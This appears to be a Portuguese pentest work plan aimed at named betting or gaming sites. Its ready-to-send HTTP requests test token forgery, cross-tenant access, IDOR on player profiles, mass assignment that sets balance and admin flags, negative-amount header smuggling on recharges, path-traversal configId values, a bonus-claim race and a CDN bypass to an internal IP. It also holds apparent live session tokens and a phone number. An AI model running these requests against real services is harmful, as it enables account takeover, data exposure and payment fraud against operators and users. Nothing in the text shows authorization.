# Próximos passos — sessão 3

## O que já está fechado

- ✅ **B1 (depósito anômalo)** — todos os 9 payloads testados, todos
  bloqueados. Backend resistiu. Não é vuln.
- ✅ **E4 IDOR (querySimpleBalance)** — descartado, param ignorado.
  Vira finding informativo, não vuln.
- ✅ **Cross-tenant via microserviço (ccgamevip)** — esclarecido como
  comportamento legítimo. Pendentes só os testes de manipulação.

## Prioridade ALTA — testar primeiro

### 1. Manipulação do token (`B10_token_manipulado.md` + `extras/cross_tenant_token.md`)

São **8 testes** — 4 no token original + 4 no microserviço. Cada um
leva 30 segundos no Repeater. Cole tudo de uma vez no `B10_*` e no
`extras/cross_tenant_token.md`:

**Bloco A — token nativo amizade**

```
GET /japi/user/balance/querySimpleBalance HTTP/2
Host: ds.amizade777.com
Token: 1:1780956891:3001:7964d1412a3f879b5472841e51bf735f
```
Expectativa: 401/403 (hash não bate).

```
GET /japi/user/balance/querySimpleBalance HTTP/2
Host: ds.amizade777.com
Token: 137028:1780956891:3001:7964d1412a3f879b5472841e51bf735f
```
Expectativa: 401/403. Se vier 200, hash não é validado → CRÍTICO.

**Bloco B — microserviço ccgamevip (use o token aphrodite gerado)**

```
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
Nbcx: 137028                   ← TROCADO
Xutc: aphrodite777
```

```
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
[REMOVIDO Nbcx]
Xutc: aphrodite777
```

```
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
Nbcx: 207587
Xutc: amizade777               ← TROCADO
```

```
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 137028:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
       ^^^^^^ trocado, mas o hash continua o mesmo
Nbcx: 137028
Xutc: aphrodite777
```

### 2. IDOR em endpoints com userId no PATH (`B4_idor.md` E5)

Esses **podem** ter rota separada do `querySimpleBalance` (que ignora
o param). Testa com seu token de amizade777:

```
GET /japi/user/player/137026 HTTP/2
Host: ds.amizade777.com
Token: 137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f

GET /japi/user/player/137028 HTTP/2
Host: ds.amizade777.com
Token: 137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f

GET /japi/user/player/1 HTTP/2
Host: ds.amizade777.com
Token: 137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f
```

**Sucesso:** retorna perfil completo (nickname, telefone, datas).
**Falha esperada:** 401/403/404 ou retorna seu próprio perfil.

### 3. Mass assignment — `POST /prod-api/player/update` (B7)

Mande tudo:
```
POST /prod-api/player/update HTTP/2
Host: ds.amizade777.com
Token: 137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f
Content-Type: application/json

{
  "balance": 999999,
  "vipLevel": 99,
  "vip_level": 99,
  "isAdmin": true,
  "is_admin": 1,
  "role": "admin",
  "userType": "admin",
  "type": 1,
  "enable": 1,
  "permissions": ["admin","superuser"]
}
```

Depois:
```
POST /prod-api/player/info HTTP/2
Host: ds.amizade777.com
Token: 137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f
```

Compara o `vip_level` antes e depois. Se mudou, é mass assignment.

## Prioridade MÉDIA

### 4. Header smuggling no recharge

```
POST /prod-api/pay-service/recharge HTTP/2
Host: ds.amizade777.com
Token: 137027:1780956891:3001:7964d1412a3f879b5472841e51bf735f
Content-Type: application/json
X-Amount: -100
X-Real-Amount: -100
X-Original-Amount: -100

{"token":"...","appPackageName":"com.slots.big","appVersion":"1.0.0","phone":"21998498419","configId":"","amount":10,"qr":1}
```

Se algum desses headers for honrado, é bypass.

### 5. Manipular `configId` no recharge

O body tem `"configId":""`. Provavelmente seleciona qual config de
pagamento usar.

```
"configId": "0"
"configId": "1"
"configId": "999"
"configId": "../admin"
"configId": [-1]
"configId": null
```

### 6. Self-invite + race no claim (B8)

A config diz `bind_invite_code_bonus_reward: 50`. Cria conta nova,
liga no seu invite (`zudp7lqx`), e tenta claim 5x simultâneo.

## Prioridade BAIXA — quando tiver tempo

### 7. Endpoints admin do B5

Tem 26 paths pra varrer. Cole o status de cada um na tabela do
`B5_admin_panel.md`. A maioria vai ser 401/404, mas algum tipo
`/actuator` ou `/swagger` pode dar 200.

### 8. IP interno expostos

Tentar conexão direta:
```
GET / HTTP/1.1
Host: ds.aphrodite777.com
```
Configurar Repeater target pra `192.10.0.168:3001`. Esperado: timeout.
Se vier 200, é bypass de CDN.

---

## Workflow recomendado

1. Faz o **bloco de token** (8 requests, 5 min) — esse é o de maior
   impacto. Se algum aceitar manipulação, pinta um achado crítico.
2. Faz o **IDOR path-based** (3 requests, 2 min).
3. Faz o **mass assignment** (2 requests, 2 min).
4. Cola tudo no GitHub e me chama.
5. Eu classifico, atualizo o `RELATORIO_FINAL.md`, e a gente vai pro
   bloco médio.

Tempo total estimado: ~15 min de Burp pra fechar a parte alta.
